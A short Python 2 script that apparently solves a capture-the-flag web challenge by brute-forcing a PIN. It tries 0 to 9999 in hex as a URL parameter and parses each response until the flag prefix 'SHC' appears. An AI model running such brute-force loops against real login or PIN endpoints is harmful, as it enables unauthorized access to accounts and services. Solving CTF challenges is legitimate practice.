import requests
from lxml import html

url = "http://ctf.sucurihc.org/flag/eua/web50/?pin="
for number in range(0,9999):
	#number = '{0:03d}'.format(number).encode('hex')
	print number
	number = hex(number).split('x')[1]
	print "Number:",number
	r = requests.get(url+str(number))
	tree = html.fromstring(r.content)
	result = tree.xpath('/html/body/div/div/center/text()')
	resultado = result[0]
	print "Result: " + resultado
	if 'SHC' in str(resultado):
		break
	
	print
